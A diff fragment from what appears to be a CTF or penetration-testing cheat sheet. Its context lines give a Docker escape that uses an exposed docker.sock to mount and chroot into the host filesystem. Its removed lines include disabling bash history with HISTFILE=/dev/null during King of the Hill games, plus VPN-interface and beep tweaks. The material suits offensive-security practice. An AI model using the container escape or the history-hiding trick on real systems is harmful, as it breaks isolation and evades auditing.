@@ -522,13 +522,3 @@ Break out of docker container<br/>
 If docker.sock is on conatiner , upload static docker binary<br/>
 `./docker -H unix:///var/run/docker.sock images`<br/>
 `./docker -H unix:///var/run/docker.sock run -it -v /:/host/ wordpress chroot /host`<br/>
-# Miscellaneous
-
-## Turning off xfce beeping sound
-`xset b off`
-
-export HISTFILE=/dev/null found this it might help you out a little when doing KOTH it basically stops bash logging your commands in the ~/.bash_history file <br/>
-sudo ifconfig tun0 down<br/>
-sudo ip link set tun0 down<br/>
-sudo ip link delete tun0<br/>
-sudo systemctl restart systemd-networkd ; sudo systemctl status systemd-networkd<br/>
